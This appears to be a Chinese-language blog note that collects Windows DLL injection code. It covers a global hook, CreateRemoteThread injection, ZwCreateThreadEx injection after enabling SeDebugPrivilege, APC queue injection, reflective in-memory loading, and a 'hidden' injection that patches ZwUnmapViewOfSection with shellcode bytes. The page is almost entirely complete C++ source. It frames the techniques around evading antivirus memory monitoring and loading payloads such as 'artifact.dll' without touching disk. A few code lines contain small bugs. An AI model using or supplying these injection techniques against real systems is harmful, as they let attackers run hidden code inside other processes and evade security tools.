https://drunkmars.top/2021/10/01/dll%E6%B3%A8%E5%85%A5/

https://bbs.pediy.com/thread-260235.htm

https://bbs.pediy.com/thread-262161.htm

全局钩子（自我调用）、远程、提权远程、APC、反射型

另外，现在很多杀软都开了内存监控，在内存中操作需要注意躲避。

# 全局钩子

```
// GolbalInjectDll.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>

int main()
{
	typedef BOOL(*typedef_SetGlobalHook)();
	typedef BOOL(*typedef_UnsetGlobalHook)();
	HMODULE hDll = NULL;
	typedef_SetGlobalHook SetGlobalHook = NULL;
	typedef_UnsetGlobalHook UnsetGlobalHook = NULL;
	BOOL bRet = FALSE;

	do
	{
		hDll = ::LoadLibraryW(TEXT("F:\\C++\\GolbalDll\\Debug\\GolbalDll.dll"));
		if (NULL == hDll)
		{
			printf("LoadLibrary Error[%d]\n", ::GetLastError());
			break;
		}

		SetGlobalHook = (typedef_SetGlobalHook)::GetProcAddress(hDll, "SetHook");
		if (NULL == SetGlobalHook)
		{
			printf("GetProcAddress Error[%d]\n", ::GetLastError());
			break;
		}

		bRet = SetGlobalHook();
		if (bRet)
		{
			printf("SetGlobalHook OK.\n");
		}
		else
		{
			printf("SetGlobalHook ERROR.\n");
		}

		system("pause");

		UnsetGlobalHook = (typedef_UnsetGlobalHook)::GetProcAddress(hDll, "UnsetHook");
		if (NULL == UnsetGlobalHook)
		{
			printf("GetProcAddress Error[%d]\n", ::GetLastError());
			break;
		}
		UnsetGlobalHook();
		printf("UnsetGlobalHook OK.\n");

	} while (FALSE);

	system("pause");
	return 0;
}
```



# 远程线程注入



```
// RemoteThreadInject.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <windows.h>
#include <TlHelp32.h>
#include "tchar.h"
char string_inject[] = "F:\\C++\\Inject\\Inject\\Debug\\Inject.dll";

//通过进程快照获取PID
DWORD _GetProcessPID(LPCTSTR lpProcessName)
{
	  DWORD Ret = 0;
	  PROCESSENTRY32 p32;

	  HANDLE lpSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	  if (lpSnapshot == INVALID_HANDLE_VALUE)
	  {
		  printf("获取进程快照失败,请重试! Error:%d", ::GetLastError());

		  return Ret;
	  }

	  p32.dwSize = sizeof(PROCESSENTRY32);
	  ::Process32First(lpSnapshot, &p32);

	  do {
		  if (!lstrcmp(p32.szExeFile, lpProcessName))
		  {
			  Ret = p32.th32ProcessID;
			  break;
		  }
	  } while (::Process32Next(lpSnapshot, &p32));

	  ::CloseHandle(lpSnapshot);
	  return Ret;
}


 //打开一个进程并为其创建一个线程
DWORD _RemoteThreadInject(DWORD _Pid, LPCWSTR DllName)
{
	     //打开进程
		 HANDLE hprocess;
	     HANDLE hThread;
		 DWORD _Size = 0;
		 BOOL Write = 0;
		 LPVOID pAllocMemory = NULL;
		 DWORD DllAddr = 0;
		 FARPROC pThread;

	     hprocess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, _Pid);
		 //Size = sizeof(string_inject);
		 _Size = (_tcslen(DllName) + 1) * sizeof(TCHAR);

		 //远程申请空间
	     pAllocMemory = ::VirtualAllocEx(hprocess, NULL, _Size, MEM_COMMIT, PAGE_READWRITE);
	    
		 if (pAllocMemory == NULL)
		     {
		         printf("VirtualAllocEx - Error!");
		         return FALSE;
		     }

		 // 写入内存
	     Write = ::WriteProcessMemory(hprocess, pAllocMemory, DllName, _Size, NULL);

	     if (Write == FALSE)
		     {
		         printf("WriteProcessMemory - Error!");
		         return FALSE;
		     }


		 //获取LoadLibrary的地址
		 pThread = ::GetProcAddress(::GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
		 LPTHREAD_START_ROUTINE addr = (LPTHREAD_START_ROUTINE)pThread;
		 
		 //在另一个进程中创建线程
		 hThread = ::CreateRemoteThread(hprocess, NULL, 0, addr, pAllocMemory, 0, NULL);
	     
		 if (hThread == NULL)
		     {
		         printf("CreateRemoteThread - Error!");
		         return FALSE;1
		     }

		 //等待线程函数结束，获得退出码
	     WaitForSingleObject(hThread, -1);
	     GetExitCodeThread(hThread, &DllAddr);

		 //释放DLL空间
	     VirtualFreeEx(hprocess, pAllocMemory, _Size, MEM_DECOMMIT);

		 //关闭线程句柄
	     ::CloseHandle(hprocess);
	     return TRUE;
}
 int main()
{
	 DWORD PID = _GetProcessPID(L"test.exe");
	 _RemoteThreadInject(PID, L"F:\\C++\\Inject\\Inject\\Debug\\Inject.dll");
}
```



# 提权后远程线程注入



```
// session0Inject.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <Windows.h>
#include <stdio.h>
#include <iostream>

void ShowError(const char* pszText)
{
	char szError[MAX_PATH] = { 0 };
	::wsprintf(szError, "%s Error[%d]\n", pszText, ::GetLastError());
	::MessageBox(NULL, szError, "ERROR", MB_OK);
}

// 提权函数
BOOL EnableDebugPrivilege()
{
	HANDLE hToken;
	BOOL fOk = FALSE;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);

		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return fOk;

}


// 使用 ZwCreateThreadEx 实现远线程注入
BOOL ZwCreateThreadExInjectDll(DWORD PID,const char* pszDllFileName)
{
	HANDLE hProcess = NULL;
	SIZE_T dwSize = 0;
	LPVOID pDllAddr = NULL;
	FARPROC pFuncProcAddr = NULL;
	HANDLE hRemoteThread = NULL;
	DWORD dwStatus = 0;

	EnableDebugPrivilege();

	// 打开注入进程，获取进程句柄
	hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	
	if (hProcess == NULL) 
	{
		printf("OpenProcess - Error!\n\n");
		return -1 ;
	}
	// 在注入的进程申请内存地址

	dwSize = ::lstrlen(pszDllFileName) + 1;
	pDllAddr = ::VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	
	if (NULL == pDllAddr)
	{
		ShowError("VirtualAllocEx - Error!\n\n");
		return FALSE;
	}
	//写入内存地址
	
	if (FALSE == ::WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize, NULL))
	{
		ShowError("WriteProcessMemory - Error!\n\n");
		return FALSE;
	}
	//加载ntdll
	HMODULE hNtdllDll = ::LoadLibrary("ntdll.dll");
	
	if (NULL == hNtdllDll)
	{
		ShowError("LoadLirbary");
		return FALSE;
	}
	// 获取LoadLibraryA函数地址
	pFuncProcAddr = ::GetProcAddress(::GetModuleHandle("Kernel32.dll"), "LoadLibraryA");
	
	if (NULL == pFuncProcAddr)
	{
		ShowError("GetProcAddress_LoadLibraryA - Error!\n\n");
		return FALSE;
	}
	
#ifdef _WIN64
	typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		ULONG CreateThreadFlags,
		SIZE_T ZeroBits,
		SIZE_T StackSize,
		SIZE_T MaximumStackSize,
		LPVOID pUnkown);
#else
	typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		BOOL CreateSuspended,
		DWORD dwStackSize,
		DWORD dw1,
		DWORD dw2,
		LPVOID pUnkown);
#endif
	
	//获取ZwCreateThreadEx函数地址
	typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)::GetProcAddress(hNtdllDll, "ZwCreateThreadEx");
	
	if (NULL == ZwCreateThreadEx)
	{
		ShowError("GetProcAddress_ZwCreateThread - Error!\n\n");
		return FALSE;
	}
	// 使用 ZwCreateThreadEx 创建远线程, 实现 DLL 注入
	dwStatus = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, 0, 0, 0, NULL);
	if (NULL == ZwCreateThreadEx)
	{
		ShowError("ZwCreateThreadEx - Error!\n\n");
		return FALSE;
	}
	// 关闭句柄
	::CloseHandle(hProcess);
	::FreeLibrary(hNtdllDll);

	return TRUE;
}

int main(int argc, char* argv[])
{
#ifdef _WIN64
	BOOL bRet = ZwCreateThreadExInjectDll(4924, "C:\\Users\\61408\\Desktop\\artifact.dll");
#else 
	BOOL bRet = ZwCreateThreadExInjectDll(4924, "C:\\Users\\61408\\Desktop\\artifact.dll");
#endif
	if (FALSE == bRet)
	{
		printf("Inject Dll Error!\n\n");
	}
	printf("Inject Dll OK!\n\n");
	return 0;
}

```



# APC注入



```
// APCInject.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
using namespace std;

void ShowError(const char* pszText)
{
    char szError[MAX_PATH] = { 0 };
    ::wsprintf(szError, "%s Error[%d]\n", pszText, ::GetLastError());
    ::MessageBox(NULL, szError, "ERROR", MB_OK);
}

//列出指定进程的所有线程
BOOL GetProcessThreadList(DWORD th32ProcessID, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength)
{
    // 申请空间
    DWORD dwThreadIdListLength = 0;
    DWORD dwThreadIdListMaxCount = 2000;
    LPDWORD pThreadIdList = NULL;
    HANDLE hThreadSnap = INVALID_HANDLE_VALUE;

    pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pThreadIdList == NULL)
    {
        return FALSE;
    }

    RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD));

    THREADENTRY32 th32 = { 0 };

    // 拍摄快照
    hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, th32ProcessID);

    if (hThreadSnap == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    // 结构的大小
    th32.dwSize = sizeof(THREADENTRY32);

    //遍历所有THREADENTRY32结构, 按顺序填入数组

    BOOL bRet = Thread32First(hThreadSnap, &th32);
    while (bRet)
    {
        if (th32.th32OwnerProcessID == th32ProcessID)
        {
            if (dwThreadIdListLength >= dwThreadIdListMaxCount)
            {
                break;
            }
            pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID;
        }
        bRet = Thread32Next(hThreadSnap, &th32);
    }

    *pThreadIdListLength = dwThreadIdListLength;
    *ppThreadIdList = pThreadIdList;

    return TRUE;
}
BOOL APCInject(HANDLE hProcess, CHAR* wzDllFullPath, LPDWORD pThreadIdList, DWORD dwThreadIdListLength)
{
    // 申请内存

    PVOID lpAddr = NULL;
    SIZE_T page_size = 4096;

    lpAddr = ::VirtualAllocEx(hProcess, nullptr, page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (lpAddr == NULL)
    {
        ShowError("VirtualAllocEx - Error\n\n");
        VirtualFreeEx(hProcess, lpAddr, page_size, MEM_DECOMMIT);
        CloseHandle(hProcess);
        return FALSE;
    }
    // 把Dll的路径复制到内存中
    if (FALSE == ::WriteProcessMemory(hProcess, lpAddr, wzDllFullPath, (strlen(wzDllFullPath) + 1) * sizeof(wzDllFullPath), nullptr))
    {
        ShowError("WriteProcessMemory - Error\n\n");
        VirtualFreeEx(hProcess, lpAddr, page_size, MEM_DECOMMIT);
        CloseHandle(hProcess);
        return FALSE;
    }

    // 获得LoadLibraryA的地址
    PVOID loadLibraryAddress = ::GetProcAddress(::GetModuleHandle("kernel32.dll"), "LoadLibraryA");

    // 遍历线程, 插入APC
    float fail = 0;
    for (int i = dwThreadIdListLength - 1; i >= 0; i--)
    {
        // 打开线程
        HANDLE hThread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);
        if (hThread)
        {
            // 插入APC
            if (!::QueueUserAPC((PAPCFUNC)loadLibraryAddress, hThread, (ULONG_PTR)lpAddr))
            {
                fail++;
            }
            // 关闭线程句柄
            ::CloseHandle(hThread);
            hThread = NULL;
        }
    }

    printf("Total Thread: %d\n", dwThreadIdListLength);
    printf("Total Failed: %d\n", (int)fail);

    if ((int)fail == 0 || dwThreadIdListLength / fail > 0.5)
    {
        printf("Success to Inject APC\n");
        return TRUE;
    }
    else
    {
        printf("Inject may be failed\n");
        return FALSE;
    }
}
int main()
{
    ULONG32 ulProcessID = 0;
    printf("Input the Process ID:");
    cin >> ulProcessID;
    CHAR wzDllFullPath[MAX_PATH] = { 0 };
    LPDWORD pThreadIdList = NULL;
    DWORD dwThreadIdListLength = 0;

#ifndef _WIN64
    strcpy_s(wzDllFullPath, "C:\\Users\\61408\\Desktop\\artifact.dll");
#else // _WIN64
    strcpy_s(wzDllFullPath, "C:\\Users\\61408\\Desktop\\artifact.dll");
#endif
    if (!GetProcessThreadList(ulProcessID, &pThreadIdList, &dwThreadIdListLength))
    {
        printf("Can not list the threads\n");
        exit(0);
    }
    //打开句柄
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, ulProcessID);

    if (hProcess == NULL)
    {
        printf("Failed to open Process\n");
        return FALSE;
    }

    //注入
    if (!APCInject(hProcess, wzDllFullPath, pThreadIdList, dwThreadIdListLength))
    {
        printf("Failed to inject DLL\n");
        return FALSE;
    }
    return 0;
}
```



# 反射型注入

文件不落地，在内存中执行dll的注入，可以不用LoadLibrary函数。

```
#include <iostream>
#include <Windows.h>
typedef struct BASE_RELOCATION_BLOCK {
       DWORD PageAddress;
       DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;
typedef struct BASE_RELOCATION_ENTRY {
       USHORT Offset : 12;
       USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
using DLLEntry = BOOL(WINAPI *)(HINSTANCE dll, DWORD reason, LPVOID reserved);
int main()
{
       //得到当前模块的基址
       PVOID imageBase = GetModuleHandleA(NULL);
       //本地加载dll内容至内存中
       HANDLE dll =  CreateFileA("C:\\Users\\onion\\Desktop\\dll\\Release\\dll.dll", GENERIC_READ,  NULL, NULL, OPEN_EXISTING, NULL, NULL);
       DWORD64 dllSize = GetFileSize(dll, NULL);
       LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);
       DWORD outSize = 0;
       ReadFile(dll, dllBytes, dllSize, &outSize, NULL);
       //获取已加载至内存中的dll的头部数据
       PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
       PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes +  dosHeaders->e_lfanew);
       SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;
       //分配dll加载时所需的内存空间
       LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase,  dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
       //得到实际分配的内存基址与预期的基址差值,便于后续进行重定向
       DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase -  (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
       //将dll头部数据复制到分配的内存空间
       std::memcpy(dllBase, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders);
       //加载节区数据至新的内存空间
       PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
       for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
       {
              LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase +  (DWORD_PTR)section->VirtualAddress);
              LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes +  (DWORD_PTR)section->PointerToRawData);
              std::memcpy(sectionDestination, sectionBytes,  section->SizeOfRawData);
              section++;
       }
       // 开始dll加载实现重定位
       IMAGE_DATA_DIRECTORY relocations =  ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
       DWORD_PTR relocationTable = relocations.VirtualAddress +  (DWORD_PTR)dllBase;
       DWORD relocationsProcessed = 0;
       while (relocationsProcessed < relocations.Size)
       {
              PBASE_RELOCATION_BLOCK relocationBlock =  (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
              relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
              DWORD relocationsCount = (relocationBlock->BlockSize -  sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
              PBASE_RELOCATION_ENTRY relocationEntries =  (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);
              for (DWORD i = 0; i < relocationsCount; i++)
              {
                     relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);
                     if (relocationEntries[i].Type == 0)
                     {
                           continue;
                     }
                     DWORD_PTR relocationRVA = relocationBlock->PageAddress +  relocationEntries[i].Offset;
                     DWORD_PTR addressToPatch = 0;
                     ReadProcessMemory(GetCurrentProcess(),  (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR),  NULL);
                     addressToPatch += deltaImageBase;
                     std::memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA),  &addressToPatch, sizeof(DWORD_PTR));
              }
       }
       //解析导入表
       PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
       IMAGE_DATA_DIRECTORY importsDirectory =  ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
       importDescriptor =  (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);
       LPCSTR libraryName = "";
       HMODULE library = NULL;
       while (importDescriptor->Name != NULL)
       {
              libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)dllBase;
              library = LoadLibraryA(libraryName);
              if (library)
              {
                     PIMAGE_THUNK_DATA thunk = NULL;
                     thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase +  importDescriptor->FirstThunk);
                     while (thunk->u1.AddressOfData != NULL)
                     {
                           if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
                           {
                                  LPCSTR functionOrdinal =  (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
                                  thunk->u1.Function =  (DWORD_PTR)GetProcAddress(library, functionOrdinal);
                           }
                           else
                           {
                                  PIMAGE_IMPORT_BY_NAME functionName =  (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
                                  DWORD_PTR functionAddress =  (DWORD_PTR)GetProcAddress(library, functionName->Name);
                                  thunk->u1.Function = functionAddress;
                           }
                           ++thunk;
                     }
              }
              importDescriptor++;
       }
       //执行加载的dll
       DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dllBase +  ntHeaders->OptionalHeader.AddressOfEntryPoint);
       (*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);
       CloseHandle(dll);
       HeapFree(GetProcessHeap(), 0, dllBytes);
       return 0;
}
```





# 隐藏DLL注入

魔改FreeLibrary函数，使得该函数只完成抹除线程信息的操作，而不抹除实际的dll。

https://www.kanxue.com/chm.htm?id=15249&pid=node1001387

```
#include <Windows.h>
#include <stdio.h>
#include "tlhelp32.h"
 
void Inject(int pID, char* Path)
{
    //获取进程句柄
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID);
 
    //申请一块内存给DLL路径
    LPVOID pReturnAddress = VirtualAllocEx(hProcess, NULL, strlen(Path) + 1, MEM_COMMIT, PAGE_READWRITE);
 
    //写入路径到上一行代码申请的内存中
    WriteProcessMemory(hProcess, pReturnAddress, Path, strlen(Path) + 1, NULL);
 
 
    //获取LoadLibraryA函数的地址
    HMODULE hModule = LoadLibrary("KERNEL32.DLL");
    LPTHREAD_START_ROUTINE lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, "LoadLibraryA");
 
 
    //创建远程线程-并获取线程的句柄
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, lpStartAddress, pReturnAddress, 0, NULL);
 
    //等待线程事件
    WaitForSingleObject(hThread, 2000);
 
 
    //防止内存泄露
    CloseHandle(hThread);
    CloseHandle(hProcess);
 
}
 
HMODULE GetProcessModuleHandleByName(DWORD pid, LPCSTR ModuleName)
{
    MODULEENTRY32 ModuleInfo;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (!hSnapshot)
    {
        return 0;
    }
    ZeroMemory(&ModuleInfo, sizeof(MODULEENTRY32));
    ModuleInfo.dwSize = sizeof(MODULEENTRY32);
    if (!Module32First(hSnapshot, &ModuleInfo))
    {
        return 0;
    }
    do
    {
        if (!lstrcmpi(ModuleInfo.szModule, ModuleName))
        {
            CloseHandle(hSnapshot);
            return ModuleInfo.hModule;
        }
    } while (Module32Next(hSnapshot, &ModuleInfo));
    CloseHandle(hSnapshot);
    return 0;
}
 
DWORD GetProcessIDByName(const char* pName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) {
        return NULL;
    }
    PROCESSENTRY32 pe = { sizeof(pe) };
    for (BOOL ret = Process32First(hSnapshot, &pe); ret; ret = Process32Next(hSnapshot, &pe)) {
        if (strcmp(pe.szExeFile, pName) == 0) {
            CloseHandle(hSnapshot);
            return pe.th32ProcessID;
        }
        //printf("%-6d %s\n", pe.th32ProcessID, pe.szExeFile);
    }
    CloseHandle(hSnapshot);
    return 0;
}
 
 
 
void UnInject(int pID, char* Path)
{
    //获取进程句柄
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID);
 
    //WriteProcessMemory("")
 
    LPVOID pReturnAddress = GetProcessModuleHandleByName(GetProcessIDByName("代码注入器.exe"), "mydll.dll");
 
    //获取LoadLibraryA函数的地址
    HMODULE hModule = LoadLibrary("KERNEL32.DLL");
    LPTHREAD_START_ROUTINE lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, "FreeLibrary");
 
 
    //创建远程线程-并获取线程的句柄
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, lpStartAddress, pReturnAddress, 0, NULL);
 
    //等待线程事件
    WaitForSingleObject(hThread, 2000);
 
 
    //防止内存泄露
    CloseHandle(hThread);
    CloseHandle(hProcess);
 
}
 
int main()
{
    const char* a = "C:\\Users\\86186\\Desktop\\mydll.dll";
 
    HANDLE hToken = NULL;
    //打开当前进程的访问令牌
    int hRet = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
 
    if (hRet)
    {
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        //取得描述权限的LUID
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        //调整访问令牌的权限
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
 
        CloseHandle(hToken);
    }
 
    //定位函数地址
    DWORD addrfun = GetProcAddress(LoadLibrary("ntdll.dll"), "ZwUnmapViewOfSection");
    printf("%x \n\n", addrfun);
    DWORD dwOldProtect;
    //修改内存属性
    VirtualProtectEx(OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIDByName("代码注入器.exe")), addrfun, 6, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    //阉割函数
    BYTE shellcode[] = { 0xc2, 0x08 , 0x00 , 0x90 , 0x90 };
    WriteProcessMemory(OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIDByName("代码注入器.exe")), addrfun, shellcode, 5, NULL);
 
    //调用FreeLibrary实现卸载
    UnInject(GetProcessIDByName("代码注入器.exe"), (char*)a);
 
    //还原原函数
    //B8 27 00 00 00
    BYTE Oldcode[] = { 0xB8, 0x27 , 0x00 , 0x00 , 0x00 };
    WriteProcessMemory(OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIDByName("代码注入器.exe")), addrfun, Oldcode, 5, NULL);
 
 
    getchar();
    return 0;
}
```

